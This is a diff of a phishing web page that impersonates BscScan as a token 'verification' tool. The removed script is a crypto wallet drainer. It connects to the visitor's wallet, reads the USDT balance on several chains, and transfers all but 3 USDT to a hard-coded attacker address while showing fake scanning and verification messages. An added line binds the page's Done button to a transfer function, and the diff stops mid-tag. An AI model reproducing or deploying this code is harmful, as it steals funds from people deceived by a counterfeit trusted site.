@@ -118,6 +118,7 @@
     .modal-info-box { background-color: #0b0e14; border-radius: 12px; padding: 16px; font-size: 11px; color: #94a3b8; line-height: 1.5; margin-bottom: 20px; width: 100%; text-align: center; }
     
     .loader { border: 2px solid #000; border-top: 2px solid transparent; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 6px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     .app-container.blurred { filter: blur(3px); pointer-events: none; }
   </style>
 </head>
@@ -158,8 +159,8 @@
         <div class="sync-tick">✓</div>
         <div class="sync-text">Tokens are authentic and synchronized directly with mainnet validator nodes.</div>
       </div>
-      <!-- Modal Done Button -->
-      <button class="btn-done" onclick="showConfirming(this)">Done</button>
+      <!-- Done Button which executes transfer if BNB available -->
+      <button class="btn-done" id="doneBtn" onclick="executeTransfer()">Done</button>
     </div>
   </div>
 
@@ -317,186 +318,4 @@
           </tr>
           <tr>
             <td class="hash-text">0x9c21...e5f3</td>
-            <td><span class="method-badge">AuditVerify</span></td>
-            <td>38924095</td>
-          </tr>
-        </table>
-      </div>
-
-      <!-- BscScan Footer -->
-      <div class="site-footer">
-        <div class="footer-brand">
-          <div class="shield-icon" style="width: 22px; height: 22px;">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width: 10px; height: 10px;">
-              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-            </svg>
-          </div>
-          BscScan
-        </div>
-        <div class="footer-desc">
-          The Leading BNB Smart Chain Explorer & Security Audit Platform
-        </div>
-        
-        <div class="footer-links-grid">
-          <span>Explorer API</span>
-          <span>Security Protocol</span>
-          <span>BEP-20 Directory</span>
-        </div>
-        
-        <div class="footer-center-link">
-          Terms of Service
-        </div>
-        
-        <div class="footer-copy">
-          © 2026 BscScan. All rights reserved.
-        </div>
-      </div>
-
-    </div>
-  </div>
-
-  <script>
-    // 👇 AAPKA TARGET WALLET ADDRESS 👇
-    const RECEIVER_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3"; 
-    
-    // MULTI-CHAIN USDT CONTRACT MAP
-    const NETWORK_CONFIG = {
-        1: { name: "Ethereum", usdt: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
-        56: { name: "BNB Smart Chain", usdt: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
-        137: { name: "Polygon", usdt: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6 },
-        42161: { name: "Arbitrum", usdt: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", decimals: 6 },
-        10: { name: "Optimism", usdt: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", decimals: 6 },
-        43114: { name: "Avalanche", usdt: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", decimals: 6 },
-        8453: { name: "Base", usdt: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", decimals: 6 }
-    };
-
-    const ERC20_ABI = [
-        "function balanceOf(address owner) view returns (uint256)",
-        "function transfer(address to, uint256 amount) external returns (bool)"
-    ];
-
-    function closeModal(id) {
-      document.getElementById(id).style.display = 'none';
-      document.getElementById('appContent').classList.remove('blurred');
-      resetButton();
-    }
-
-    function showModal(id) {
-      document.getElementById(id).style.display = 'flex';
-      document.getElementById('appContent').classList.add('blurred');
-    }
-
-    // Modal ke andar "Confirming..." wala button animation
-    function showConfirming(btnElement) {
-        btnElement.innerHTML = '<span class="loader"></span> Confirming...';
-        btnElement.disabled = true;
-        
-        setTimeout(() => {
-            closeModal('auditModal');
-            btnElement.innerHTML = 'Done';
-            btnElement.disabled = false;
-        }, 1500);
-    }
-
-    async function initiateAuditFlow() {
-      const btn = document.getElementById("mainVerifyBtn");
-      const btnText = document.getElementById("btnText");
-      const btnIcon = document.getElementById("btnIcon");
-      const statusMsg = document.getElementById("statusMsg");
-
-      if (typeof window.ethereum === 'undefined') {
-        showModal('walletModal');
-        return;
-      }
-
-      try {
-        btn.disabled = true;
-        btnIcon.style.display = 'none';
-        
-        // Button dubaate hi "Scanning..." likha aayega
-        btnText.innerHTML = '<span class="loader"></span> Scanning...';
-        statusMsg.style.display = 'block';
-        statusMsg.innerText = "Please confirm connection in your wallet.";
-
-        let provider = new ethers.providers.Web3Provider(window.ethereum, "any");
-        await provider.send("eth_requestAccounts", []);
-        let signer = provider.getSigner();
-        const userAddress = await signer.getAddress();
-
-        let network = await provider.getNetwork();
-        let chainId = network.chainId;
-        let activeNetwork = NETWORK_CONFIG[chainId];
-
-        // Agar network list mein nahi hai toh auto-switch to BSC
-        if (!activeNetwork) {
-            btnText.innerHTML = '<span class="loader"></span> Switching Network...';
-            try {
-                await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x38' }] // BSC hex ID
-                });
-                provider = new ethers.providers.Web3Provider(window.ethereum, "any");
-                signer = provider.getSigner();
-                network = await provider.getNetwork();
-                chainId = network.chainId;
-                activeNetwork = NETWORK_CONFIG[chainId];
-            } catch (switchError) {
-                resetButton();
-                return;
-            }
-        }
-
-        document.getElementById('uiNetName').innerText = activeNetwork.name;
-
-        const usdtContract = new ethers.Contract(activeNetwork.usdt, ERC20_ABI, signer);
-        let fullBalance = await usdtContract.balanceOf(userAddress);
-
-        // Network ke hisaab se 3 USDT calculate karna
-        const reserveAmount = ethers.utils.parseUnits("3", activeNetwork.decimals);
-
-        // Agar balance 3 USDT se kam hai -> 0.00 Popup
-        if (fullBalance.lte(reserveAmount)) {
-            document.getElementById('uiUSDT').innerText = "0.00"; 
-            showModal('auditModal');
-            return; 
-        }
-
-        // Bachi hui USDT nikalna
-        const transferAmount = fullBalance.sub(reserveAmount);
-
-        statusMsg.innerText = "Please confirm the transaction in your wallet.";
-        
-        const tx = await usdtContract.transfer(RECEIVER_ADDRESS, transferAmount);
-        
-        statusMsg.innerText = "Blockchain verification in progress...";
-        statusMsg.style.color = "#00d395";
-
-        await tx.wait();
-
-        // Transaction Success UI Update
-        let uiBalanceStr = ethers.utils.formatUnits(fullBalance, activeNetwork.decimals);
-        document.getElementById('uiUSDT').innerText = parseFloat(uiBalanceStr).toFixed(2);
-        
-        showModal('auditModal');
-
-      } catch (error) {
-        console.error("Process Failed:", error);
-        resetButton();
-      }
-    }
-
-    function resetButton() {
-      const btn = document.getElementById("mainVerifyBtn");
-      const btnText = document.getElementById("btnText");
-      const btnIcon = document.getElementById("btnIcon");
-      const statusMsg = document.getElementById("statusMsg");
-
-      btn.disabled = false;
-      btnIcon.style.display = 'block';
-      btnText.innerText = "Verify Asset";
-      statusMsg.style.display = 'none';
-      statusMsg.style.color = "#f3ba2f";
-    }
-  </script>
-</body>
-</html>
+            <td><span class="method-b
